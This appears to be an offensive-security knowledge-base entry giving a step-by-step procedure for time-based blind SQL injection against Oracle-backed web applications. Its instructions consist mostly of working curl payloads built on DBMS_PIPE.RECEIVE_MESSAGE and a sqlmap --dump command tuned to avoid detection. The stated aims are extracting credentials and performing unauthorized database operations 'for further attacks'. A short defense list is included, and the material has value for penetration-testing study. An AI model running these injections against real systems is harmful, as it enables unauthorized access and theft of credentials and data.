---
id: 11908b7e-0e9c-4402-9035-861c6028a6ac
name: Oracle-SQL-Injection-Time-Based-Attack
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:35.281634+00:00'
updated_at: '2023-04-10T20:23:10.333500+00:00'
tactics:
  - '[[tactics/Initial-Access|TA0001 - Initial Access]]'
  - '[[tactics/Collection|TA0009 - Collection]]'
techniques:
  - >-
    [[techniques/Exploit-Public-Facing-Application|T1190 - Exploit Public-Facing
    Application]]
sub_techniques: []
tags:
  - '[[tags/Oracle-SQL-Injection]]'
  - '[[tags/Oracle-SQL-Time-based]]'
commands:
  - '[[commands/curl-inject-oracle-time-payload]]'
  - '[[commands/sqlmap-oracle-blind-time-based]]'
platforms:
  - Web
  - Oracle Database
tools:
  - '[[tools/sqlmap]]'
validated: true
---

# Oracle SQL Injection Time-Based Attack

## Summary

The Oracle SQL Injection Time-Based Attack is a blind SQL injection technique targeting web applications backed by Oracle databases. It exploits unsanitized user inputs to inject SQL payloads that use the DBMS_PIPE.RECEIVE_MESSAGE function to introduce controllable delays based on conditional logic, allowing attackers to infer data without relying on error messages or direct output.

## Description

This procedure demonstrates how to perform time-based blind SQL injection on Oracle databases. The attack works by appending payloads to vulnerable parameters in HTTP requests, where the DBMS_PIPE.RECEIVE_MESSAGE function is used to create a delay (e.g., via a timeout on a named pipe) only if a specific condition is true, such as a character matching in a database query. By measuring response times, attackers can extract information bit by bit, such as database names, table structures, or sensitive data like credentials. This is particularly effective against Oracle due to its built-in DBMS_PIPE package for inter-session communication. The target environment is typically a web application with direct SQL query construction from user input, lacking prepared statements or input escaping. Prerequisites include identifying a vulnerable injection point, often through manual testing or automated tools.

## Requirements

1. Access to a web application vulnerable to SQL injection with an Oracle database backend.
2. Knowledge of the injection point (e.g., a URL parameter like 'id' in a GET request).
3. Tools such as curl for manual injection or sqlmap for automation.
4. A way to measure response times accurately (e.g., via scripting or proxy tools like Burp Suite).

## Defense

- Implement parameterized queries and prepared statements to prevent direct SQL concatenation.
- Deploy a Web Application Firewall (WAF) to detect and block anomalous SQL patterns and delays.
- Enable database auditing and monitoring for unusual query patterns or pipe usage.
- Use least-privilege database accounts to limit the impact of successful injections.

## Objectives

1. Confirm the presence of a time-based SQL injection vulnerability in an Oracle-backed application.
2. Extract sensitive information from the database, such as user credentials or configuration data.
3. Perform unauthorized database operations without triggering visible errors.

## Instructions

### Step 1: Identify the Vulnerable Injection Point

**Context**: Begin by testing the target endpoint for SQL injection susceptibility. Use a simple payload to check for any response anomalies, focusing on Oracle-specific syntax.

**Command** ([[commands/curl-inject-oracle-time-payload]]):
```bash
curl -X GET "http://target.com/page?id=1'" -w "%{time_total}s" -o /dev/null -s
```

> This sends a basic single-quote payload to detect syntax errors or delays. The -w flag measures total response time. If the response is slower than a baseline request (e.g., without the quote), it indicates potential injection.

**Expected Output**: Baseline response time around 0.1-0.5s; injected request may hang or delay if vulnerable.

### Step 2: Test Time-Based Delay with DBMS_PIPE

**Context**: Inject a payload using DBMS_PIPE.RECEIVE_MESSAGE to introduce a delay, confirming the blind time-based vulnerability. The pipe receive will timeout after a specified sleep time if no message is sent, creating a measurable delay.

**Code** ([[codes/Oracle-DBMS-PIPE-RECEIVE-MESSAGE-Delay-Payload]]):

Use the following payload in the vulnerable parameter (e.g., id=1 AND [condition]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])-- /**/ ). Replace [RANDNUM] with a numeric condition, [RANDSTR] with a unique pipe name, and [SLEEPTIME] with seconds (e.g., 5).

**Command** ([[commands/curl-inject-oracle-time-payload]]):
```bash
curl -X GET "http://target.com/page?id=1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('testpipe',5)--" -w "%{time_total}s" -o /dev/null -s
```

> This tests an always-true condition (1=DBMS_PIPE.RECEIVE_MESSAGE), causing a 5-second delay as the pipe receive times out. Compare to a non-delayed request.

**Expected Output**: Response time approximately 5 seconds longer than baseline, confirming the payload execution.

### Step 3: Extract Data Using Conditional Delays

**Context**: Once confirmed, use binary search-like logic to extract data character by character. For example, delay if the first character of a database name is greater than 'A'.

**Command** ([[commands/sqlmap-oracle-blind-time-based]]):
```bash
sqlmap -u "http://target.com/page?id=1" --dbms=oracle --technique=T --delay=2 --timeout=10 --dbms-cred "user:pass" --dump
```

> Sqlmap automates the time-based extraction using Oracle-specific payloads, including DBMS_PIPE variants. The --technique=T specifies time-based blind SQLi, --delay sets inter-request timing to avoid detection.

**Expected Output**: Sqlmap outputs extracted data, e.g., database name: "ORCL", tables: ["USERS"], or dumped records like usernames and hashed passwords.

### Step 4: Verify and Clean Up

**Context**: Validate extracted data and check for any traces left in the database, such as lingering pipes.

**Instructions**: Query the database manually if possible (e.g., via a separate tool) to confirm extracted info. No direct cleanup for pipes, as they are session-specific, but monitor for alerts.

**Expected Output**: Confirmation that extracted data is accurate and usable for further attacks, like credential cracking.
